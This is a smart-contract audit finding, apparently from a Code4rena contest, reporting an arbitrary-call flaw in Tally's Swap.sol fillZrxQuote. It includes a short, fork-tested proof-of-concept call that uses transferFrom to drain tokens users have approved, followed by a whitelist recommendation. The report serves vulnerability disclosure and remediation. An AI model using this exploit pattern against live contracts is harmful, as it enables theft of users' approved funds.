# Handle  WatchPug   # Vulnerability details  https://github.com/code-423n4/2021-10-tally/blob/c585c214edb58486e0564cb53d87e4831959c08b/contracts/swap/Swap.sol#L200-L212  ```solidity function fillZrxQuote(     IERC20 zrxBuyTokenAddress,     address payable zrxTo,     bytes calldata zrxData,     uint256 ethAmount ) internal returns (uint256, uint256) {     uint256 originalERC20Balance = 0;     if(!signifiesETHOrZero(address(zrxBuyTokenAddress))) {         originalERC20Balance = zrxBuyTokenAddress.balanceOf(address(this));     }     uint256 originalETHBalance = address(this).balance;      (bool success,) = zrxTo.call{value: ethAmount}(zrxData); ```  A call to an arbitrary contract with custom calldata is made in `fillZrxQuote()`, which means the contract can be an ERC20 token, and the calldata can be `transferFrom` a previously approved user.  ### Impact  The wallet balances (for the amount up to the allowance limit) of the tokens that users approved to the contract can be stolen.  ### PoC  Given:  - Alice has approved 1000 WETH to `Swap.sol`;  The attacker can:  ``` TallySwap.swapByQuote(     address(WETH),     0,     address(WETH),     0,     address(0),     address(WETH),     abi.encodeWithSignature(         "transferFrom(address,address,uint256)",         address(Alice),         address(this),         1000 ether     ) ) ```  As a result, 1000 WETH will be stolen from Alice and sent to the attacker.  This PoC has been tested on a forking network.  ### Recommendation  Consider adding a whitelist for `zrxTo` addresses.
